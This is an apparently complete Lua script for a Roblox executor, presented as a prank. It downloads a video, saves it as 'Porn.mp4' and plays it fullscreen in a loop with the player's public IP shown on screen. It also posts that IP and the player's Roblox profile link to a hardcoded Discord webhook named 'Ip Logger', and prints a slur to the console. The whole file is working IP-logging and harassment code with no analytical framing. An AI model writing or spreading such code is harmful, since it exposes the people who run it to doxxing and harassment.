
-- http
local request = http_request or request or (http and http.request) or (syn and syn.request)

-- Information
local IP = request({Url="https://api.ipify.org",Method="GET"}).Body
local UserId = game.Players.LocalPlayer.UserId
local Video = game:HttpGet("https://github.com/dotdotdotdotdot/Test-1/blob/main/y2mate.com%20-%20you%20are%20an%20idiot_480p.mp4?raw=true")

-- Main
do
    if not isfile("Porn.mp4") then
        writefile("Porn.mp4", Video)
    end
    print("gay LOLOLOLO!!!")
end

-- Elements
local MADEBYHERACLIOUS = Instance.new("ScreenGui")
MADEBYHERACLIOUS.Parent = game.CoreGui
MADEBYHERACLIOUS.IgnoreGuiInset = true
MADEBYHERACLIOUS.ResetOnSpawn = false

local Troll = Instance.new("VideoFrame",MADEBYHERACLIOUS)
Troll.Size = UDim2.new(1,0,1,0)
Troll.Video = syn and getsynasset("Porn.mp4") or getcustomasset("Porn.mp4")
Troll.Volume = 50
Troll.Looped = true

local string = Instance.new("TextLabel",Troll)
string.Text = tostring(IP)
string.Size = UDim2.new(1,0,0.1,0)

repeat wait() until Troll.Loaded

Troll:Play()

local data = {
    ["username"] = "Ip Logger",
    ["content"] = "Ip: "..IP..". ".."https://www.roblox.com/users/"..UserId.."/profile",
}
request(
    {
        Url = "https://discord.com/api/webhooks/1021573158039466014/LxV32E3DUxVEDP56B3m6BqeBBViY9GHwmyL7k8aGs7sEPg465ktuDLj2mx5bsZkWB7gF",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)
